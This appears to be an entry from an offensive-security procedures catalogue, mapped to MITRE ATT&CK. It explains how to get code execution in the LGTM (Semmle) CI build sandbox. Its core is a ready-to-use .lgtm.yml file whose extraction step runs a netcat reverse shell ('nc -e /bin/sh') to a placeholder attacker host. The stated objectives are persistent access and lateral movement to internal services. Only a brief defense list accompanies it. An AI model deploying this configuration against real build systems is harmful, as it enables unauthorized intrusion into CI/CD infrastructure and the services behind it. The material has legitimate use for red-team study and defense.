---
id: proc-lgtm-rce-yaml
tags:
  - rce
  - lgtm
  - yaml
  - reverse-shell
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:32:57.756Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
---
# Trigger-RCE-via-LGTM-YAML

## Summary

This procedure exploits the LGTM build process by configuring a .lgtm.yml file in a GitHub repository to execute arbitrary commands, establishing a reverse shell during the sandboxed build.

## Description

In the LGTM (Semmle) environment, the build sandbox allows custom YAML configurations that run during analysis. By injecting a command to spawn a reverse shell, an attacker gains RCE within the container, providing access to explore and exploit internal services like the Docker Registry. This targets cloud-based CI/CD pipelines without proper sandbox isolation.

## Requirements

1. GitHub account for repository creation
2. Knowledge of target build environment (LGTM sandbox)
3. Attacker's host and port for reverse shell

## Defense

Defensive measures and detection strategies:

- Validate and sandbox YAML configurations in CI/CD pipelines
- Monitor outbound connections from build environments
- Use network policies to block unauthorized reverse shells

## Objectives

1. Gain initial RCE in the LGTM build container
2. Establish persistent access via reverse shell
3. Enable further lateral movement to internal services

## Instructions

### Step 1: Create GitHub Repository

**Context**: Set up a new repository to host the malicious build configuration.

No command; manually create repo on GitHub.

> Commit an empty project or minimal files to trigger LGTM integration.

### Step 2: Add .lgtm.yml File

**Context**: Configure the YAML to execute a reverse shell command during build.

No command; create file .lgtm.yml with content:

```yaml
lgtm:
  language: none
extraction:
  steps:
    - run: nc -e /bin/sh ATTACKER_HOST ATTACKER_PORT
```

> Replace ATTACKER_HOST and ATTACKER_PORT. Push to repo to activate on LGTM.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- rce
- lgtm
- yaml

---
